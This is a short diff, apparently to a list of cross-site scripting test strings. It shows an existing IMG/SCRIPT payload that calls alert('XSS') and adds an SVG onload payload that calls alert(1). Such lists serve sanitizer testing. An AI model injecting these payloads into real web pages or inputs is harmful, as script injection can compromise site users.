@@ -2,3 +2,4 @@
 
 <IMG """><SCRIPT>alert("XSS")</SCRIPT>">
 
+<svg onload="alert(1)">
